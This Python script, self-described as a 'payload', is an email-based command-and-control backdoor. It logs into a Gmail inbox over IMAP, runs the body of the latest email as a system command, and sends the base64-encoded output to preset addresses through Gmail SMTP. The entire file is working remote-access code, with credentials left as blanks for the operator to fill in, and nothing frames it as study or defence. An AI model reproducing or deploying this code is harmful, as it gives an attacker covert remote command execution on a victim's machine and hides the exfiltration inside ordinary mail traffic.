#!/bin/env python

import imaplib
import smtplib
import email
import subprocess
import base64


email_add = '' # Gmail of this payload
password = '' # Password of this Gmail
to = [''] # Gmails to send the output


def mail():
    mail = imaplib.IMAP4_SSL('imap.gmail.com')
    mail.login(email_add, password)

    mail.select('inbox')

    result, data = mail.uid('search', None, 'ALL')

    latest_email_uid = data[0].split()[-1]
    result, data = mail.uid('fetch', latest_email_uid, '(RFC822)')
    raw_email = data[0][1]
    msg = email.message_from_bytes(raw_email)
    hdr = email.header.make_header(email.header.decode_header(msg['Subject']))
    subject = str(hdr)

    for part in msg.walk():
        body = part.get_payload(decode=True)
        if body is not None:
            break
    return body.decode()

def send(data):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_add, password)
    server.sendmail(email_add, to, str(data).encode())
    

command = mail().replace('\r', '').replace('\n', '')

dd = subprocess.run(command.split(" "), stdout=subprocess.PIPE).stdout.decode('utf-8')
text = f"Output: {dd}"
d = base64.b64encode(text.encode())
send(d)
